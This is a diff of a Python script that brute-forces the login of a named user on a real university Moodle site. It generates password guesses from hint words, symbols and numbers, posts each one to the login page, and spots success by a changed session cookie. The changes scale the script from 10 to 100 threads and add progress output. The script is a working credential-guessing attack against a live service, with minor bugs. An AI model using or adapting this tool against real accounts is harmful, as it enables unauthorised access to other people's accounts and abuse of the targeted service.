@@ -11,14 +11,17 @@ import os
 url="https://moodle.niituniversity.in/moodle/login/index.php"
 user="chowdavarapu.sriker"
 combinations=8*8*8*8*8*8*8*8
+print("Total possible combinations 900\n")
+timeExe = time.time()
 #res = itertools.permutations('srikar1.',8)
-arr1=["srikar","lucifer","sriker"]
-arr2=[".","@","#"]
+arr1=["you hints here"]
+arr2=["Second set of hints"]
 arr3=[]
+
 for z in range(100):
     arr3.append(str(z))
 res=itertools.product(arr1,arr2,arr3)
-count=0
+Failscount = 0 
 
 #File Object
 f=open("password.txt","w+")
@@ -45,21 +48,32 @@ def passwordCracker(combination):
         pas="".join(combination)
         login_data=dict(username=user,password=pas)
         s.post(url,data=login_data)
-        session2=s.cookies["MoodleSession"]
+        session2=s.cookies["MoodleSession"] 
         for fake in range(1):
             if session1!=session2:
                 with print_lock:
-                    print("PASSWORD FOUND - " + str(pas))
+                    #print("[+] PASSWORD FOUND - " + str(pas))
+                    sys.stdout.write("\r[+] PASSWORD FOUND - " + str(pas))
+                    print("Time Executed - " + str(timeExe - time.time()))
+                    print("Password found by " + str(threading.currnet_thread().name))
+                    sys.stdout.flush()
+                sys.stdout.write("\n")
                 os._exit(1)
             else:
+                global Failscount
+                Failscount = Failscount + 1
                 with print_lock:
-                    print(str(pas)  + "  not Match")
-    except Exception:
-        print("\nChanging IP Address\n")
+                    sys.stdout.write("\r Fails - " + str(Failscount))
+                    sys.stdout.write(" [-] not match - " + str(pas))
+                    sys.stdout.flush()
+                #sys.stdout.write("\n")
+                    #print("[-] " + str(pas) + " not Match")
+    except Exception as e:
+        #print(str(e) + "\n")
         time.sleep(5)
 
 #Creating Threads
-for thread in range(10):
+for thread in range(100):
     th = threading.Thread(target=threader)
     th.daemon = True
     th.start()
